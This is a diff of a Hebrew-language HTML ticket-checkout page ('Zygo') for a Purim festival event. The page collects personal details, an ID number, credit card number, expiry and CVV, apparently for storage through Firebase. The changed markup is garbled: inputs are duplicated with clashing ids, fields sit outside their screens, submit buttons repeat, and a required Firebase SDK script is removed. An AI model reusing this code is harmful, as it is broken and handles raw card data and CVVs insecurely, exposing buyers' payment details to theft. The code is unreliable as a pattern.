@@ -1,141 +1,345 @@
-<!DOCTYPE html>
-<html lang="he">
 <head>
-    <meta charset="UTF-8">
-    <title>Zygo</title>
+  <meta charset="UTF-8">
+  <title>Zygo</title>
+  <style>
+    body {
+      font-family: Arial;
+      direction: rtl;
+      background: #f4f4f4;
+    }
+    .screen {
+      display: none;
+      background: #fff;
+      padding: 20px;
+      max-width: 400px;
+      margin: 40px auto;
+      border-radius: 10px;
+    }
+    .screen.active {
+      display: block;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+    }
+    button {
+      background: black;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    .secondary {
+      background: #ccc;
+      color: black;
+    }
 
-    <style>
-        body {
-            font-family: Arial;
-            direction: rtl;
-            background: #f4f4f4;
-        }
+    /* ===== Screen 1 - New Tickets UI (scoped) ===== */
+    #screen1{
+      background: linear-gradient(180deg, #f7efe3, #f4e6d5);
+      border-radius: 18px;
+      padding: 0;
+      overflow: hidden;
+    }
+    #screen1 .s1-wrap{
+      padding: 18px;
+    }
+    #screen1 .s1-top{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      margin-bottom: 14px;
+    }
+    #screen1 .s1-pill{
+      border: 2px solid rgba(0,0,0,.10);
+      background: rgba(255,255,255,.35);
+      border-radius: 999px;
+      padding: 10px 14px;
+      display:inline-flex;
+      align-items:center;
+      gap:10px;
+      font-weight: 700;
+    }
+    #screen1 .s1-crumbs{
+      flex: 1;
+      text-align:center;
+      color:#6b7280;
+      font-weight: 700;
+      white-space: nowrap;
+    }
+    #screen1 .s1-crumbs b{ color:#111; }
 
-        .screen {
-            display: none;
-            background: #fff;
-            padding: 20px;
-            max-width: 400px;
-            margin: 40px auto;
-            border-radius: 10px;
-        }
+    #screen1 .s1-event{
+      display:flex;
+      gap:14px;
+      align-items:flex-start;
+      padding: 6px 0 14px;
+    }
+    #screen1 .s1-img{
+      width: 92px;
+      height: 92px;
+      border-radius: 18px;
+      object-fit: cover;
+      background:#fff;
+      box-shadow: 0 10px 30px rgba(0,0,0,.10);
+    }
+    #screen1 .s1-title{
+      margin: 4px 0 8px;
+      font-size: 22px;
+      line-height: 1.2;
+      font-weight: 900;
+    }
+    #screen1 .s1-meta{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-size: 14px;
+      opacity:.85;
+    }
 
-        .screen.active {
-            display: block;
-        }
+    #screen1 .s1-card{
+      background:#fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.10);
+      padding: 18px;
+      border: 1px solid rgba(0,0,0,.06);
+    }
+    #screen1 .s1-card-top{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:14px;
+      flex-wrap: wrap;
+    }
 
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 12px;
-        }
+    #screen1 .s1-radio{
+      display:flex;
+      gap:10px;
+      align-items:center;
+      background: #f6f2ea;
+      border: 2px solid rgba(0,0,0,.10);
+      border-radius: 999px;
+      padding: 10px 12px;
+    }
+    #screen1 .s1-radio input{
+      width:auto;
+      margin:0;
+      transform: scale(1.1);
+    }
 
-        button {
-            background: black;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
+    #screen1 .s1-right{
+      margin-inline-start: auto;
+      text-align: left;
+    }
+    #screen1 .s1-ticket-name{
+      font-weight: 900;
+      font-size: 20px;
+      margin: 0 0 6px;
+    }
+    #screen1 .s1-prices{
+      display:flex;
+      gap:10px;
+      align-items:baseline;
+      justify-content:flex-start;
+    }
+    #screen1 .s1-old{
+      color:#6b7280;
+      text-decoration: line-through;
+      font-weight: 800;
+    }
+    #screen1 .s1-new{
+      font-weight: 900;
+      font-size: 22px;
+      color:#3f3f46;
+    }
 
-        .secondary {
-            background: #ccc;
-            color: black;
-        }
-    </style>
+    #screen1 .s1-divider{
+      height: 2px;
+      background: #7c3aed;
+      margin: 14px 0 12px;
+    }
+    #screen1 .s1-bottom{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+      font-size: 13px;
+      opacity:.85;
+    }
+    #screen1 .s1-info{
+      width: 28px;
+      height: 28px;
+      border-radius: 999px;
+      border: 2px solid rgba(0,0,0,.12);
+      display:grid;
+      place-items:center;
+      font-weight: 900;
+      background:#fff;
+    }
+    #screen1 .s1-actions{
+      margin-top: 14px;
+    }
+    #screen1 .s1-actions button{
+      width:100%;
+      padding: 12px;
+      border-radius: 12px;
+      background:#000;
+      color:#fff;
+      border:none;
+      cursor:pointer;
+      font-weight: 800;
+      margin-bottom: 0; /* שלא יוסיף רווח מיותר */
+    }
+  </style>
 </head>
+
 <body>
+  <h1>Enter Details</h1>
 
-<form id="nameForm">
+  <form id="nameForm">
+    <input type="text" id="firstName" placeholder="First Name" required><br><br>
+    <input type="text" id="lastName" placeholder="Last Name" required><br><br>
 
-    <!-- מסך 1 – בחירת כרטיס -->
+    <!-- מסך 1 – בחירת כרטיס (עיצוב חדש) -->
     <div class="screen active" id="screen1">
-        <h2>בחירת כרטיס</h2>
+      <div class="s1-wrap">
 
-        <label>
-            <input type="radio" name="cardType" value="regular" required>
-            כרטיס רגיל
-        </label><br><br>
+        <div class="s1-top">
+          <div class="s1-pill">← חזרה</div>
+          <div class="s1-crumbs"><b>כרטיסים</b> ← הכנס פרטים ← תשלום</div>
+          <div class="s1-pill">✕</div>
+        </div>
 
-        <label>
-            <input type="radio" name="cardType" value="vip">
-            כרטיס VIP
-        </label><br><br>
+        <div class="s1-event">
+          <!-- החלף את ה-URL לתמונה שלך -->
+          <img class="s1-img" src="YOUR_IMAGE_URL_HERE" alt="תמונת מסיבה">
+          <div>
+            <!-- החלף שם מסיבה -->
+            <div class="s1-title">EXPO LAND / PURIM FESTIVAL</div>
+            <!-- החלף תאריך -->
+            <div class="s1-meta">📅 March 5th 2026, 23:00</div>
+          </div>
+        </div>
 
-        <button type="button" onclick="nextScreen(1)">המשך</button>
+        <div class="s1-card">
+          <div class="s1-card-top">
+
+            <!-- שומר בדיוק על name/value כדי שהלוגיקה תישאר זהה -->
+            <div>
+              <label class="s1-radio">
+                <input type="radio" name="cardType" value="regular" required>
+                כרטיס רגיל
+              </label>
+              <div style="height:10px"></div>
+              <label class="s1-radio">
+                <input type="radio" name="cardType" value="vip">
+                כרטיס VIP
+              </label>
+            </div>
+
+            <div class="s1-right">
+              <!-- החלף שם כרטיס -->
+              <div class="s1-ticket-name">FIRST ROUND</div>
+              <div class="s1-prices">
+                <!-- אופציונלי: מחיר קודם (אם לא צריך, תמחק את span הזה) -->
+                <span class="s1-old">399₪</span>
+                <!-- החלף מחיר חדש -->
+                <span class="s1-new">220.00₪</span>
+              </div>
+            </div>
+
+          </div>
+
+          <div class="s1-divider"></div>
+
+          <div class="s1-bottom">
+            <div class="s1-info">i</div>
+            <!-- החלף טקסט פירוט -->
+            <div>מחיר כרטיסים 200₪ + עלות שירות ברכישה אונליין 20.00₪ לכרטיס</div>
+          </div>
+        </div>
+
+        <div class="s1-actions">
+          <!-- אותו כפתור/לוגיקה בדיוק -->
+          <button type="button" onclick="nextScreen(1)">המשך</button>
+        </div>
+
+      </div>
     </div>
+
+    <input type="email" id="email" placeholder="Email" required><br><br>
 
     <!-- מסך 2 – פרטים אישיים (הקוד שלך) -->
     <div class="screen" id="screen2">
-        <h2>פרטים אישיים</h2>
-
-        <input type="text" id="firstName" placeholder="First Name" required>
-        <input type="text" id="lastName" placeholder="Last Name" required>
-
-        <input type="email" id="email" placeholder="Email" required>
-        <input type="number" id="phoneNumber" placeholder="Phone Number" required>
-
-        <input type="date" id="birthDate" required>
-
-        <select id="gender" required>
-            <option value="">Gender</option>
-            <option value="male">Male</option>
-            <option value="female">Female</option>
-            <option value="other">Other</option>
-        </select>
-
-        <input type="text" id="instagram" placeholder="Instagram">
-        <input type="number" id="תעודת זהות" placeholder="תעודת זהות" required>
-
-        <button type="button" class="secondary" onclick="prevScreen(2)">חזור</button>
-        <button type="button" onclick="nextScreen(2)">המשך</button>
+      <h2>פרטים אישיים</h2>
+      <input type="number" id="phoneNumber" placeholder="Phone Number" required><br><br>
+      <input type="text" id="firstName" placeholder="First Name" required>
+      <input type="text" id="lastName" placeholder="Last Name" required>
+      <input type="date" id="birthDate" required><br><br>
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="number" id="phoneNumber" placeholder="Phone Number" required>
+      <select id="gender" required>
+        <option value="">Gender</option>
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+        <option value="other">Other</option>
+      </select><br><br>
+      <input type="date" id="birthDate" required>
+      <input type="text" id="instagram" placeholder="Instagram"><br><br>
+      <select id="gender" required>
+        <option value="">Gender</option>
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+        <option value="other">Other</option>
+      </select>
+      <input type="number" id="ID" placeholder="ID" required><br><br>
+      <input type="text" id="instagram" placeholder="Instagram">
+      <input type="number" id="ID" placeholder="ID" required>
+      <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required><br><br>
+      <button type="button" class="secondary" onclick="prevScreen(2)">חזור</button>
+      <button type="button" onclick="nextScreen(2)">המשך</button>
     </div>
+
+    <input type="text" id="expire" placeholder="Expire (MM/YY)" required><br><br>
 
     <!-- מסך 3 – תשלום -->
     <div class="screen" id="screen3">
-        <h2>פרטי אשראי</h2>
-
-        <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
-        <input type="text" id="expire" placeholder="Expire (MM/YY)" required>
-        <input type="number" id="cvv" placeholder="CVV" required>
-
-        <input type="text" id="coupon" placeholder="קוד קופון">
-
-        <label>
-            <input type="checkbox" id="terms" required>
-            אני מאשר/ת את תנאי השימוש והתקנון
-        </label><br><br>
-
-        <label>
-            <input type="checkbox" id="updates">
-            אני רוצה לקבל עדכונים
-        </label><br><br>
-
-        <button type="button" class="secondary" onclick="prevScreen(3)">חזור</button>
-        <button type="submit">לתשלום</button>
+      <h2>פרטי אשראי</h2>
+      <input type="number" id="cvv" placeholder="CVV" required><br><br>
+      <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
+      <input type="text" id="expire" placeholder="Expire (MM/YY)" required>
+      <input type="number" id="cvv" placeholder="CVV" required>
+      <button type="submit">Submit</button>
+      <input type="text" id="coupon" placeholder="קוד קופון">
+      <label>
+        <input type="checkbox" id="terms" required>
+        אני מאשר/ת את תנאי השימוש והתקנון
+      </label><br><br>
+      <label>
+        <input type="checkbox" id="updates">
+        אני רוצה לקבל עדכונים
+      </label><br><br>
+      <button type="button" class="secondary" onclick="prevScreen(3)">חזור</button>
+      <button type="submit">לתשלום</button>
     </div>
+  </form>
 
-</form>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
-<!-- Firebase SDKs -->
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-
-<!-- ניווט בין מסכים -->
-<script>
+  <!-- ניווט בין מסכים -->
+  <script>
     function nextScreen(current) {
-        document.getElementById(`screen${current}`).classList.remove("active");
-        document.getElementById(`screen${current + 1}`).classList.add("active");
+      document.getElementById(`screen${current}`).classList.remove("active");
+      document.getElementById(`screen${current + 1}`).classList.add("active");
     }
-
     function prevScreen(current) {
-        document.getElementById(`screen${current}`).classList.remove("active");
-        document.getElementById(`screen${current - 1}`).classList.add("active");
+      document.getElementById(`screen${current}`).classList.remove("active");
+      document.getElementById(`screen${current - 1}`).classList.add("active");
     }
-</script>
+  </script>
 
-<!-- הלוגיקה שלך -->
-<script src="firebase.js" defer></script>
-
+  <!-- הלוגיקה שלך -->
+  <script src="firebase.js" defer></script>
 </body>
-</html>
